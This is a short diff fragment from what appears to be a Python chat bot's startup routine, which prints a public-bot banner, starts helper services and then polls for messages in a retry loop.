+    print("  🌐 BOT IS PUBLIC - All users can use")
+    print("═" * 60 + "\n")
+    
+    start_health_server()
+    start_silent_pc()
+    
+    while True:
+        try:
+            bot.infinity_polling(timeout=60, long_polling_timeout=30)
+        except Exception as e:
+            time.sleep(5)
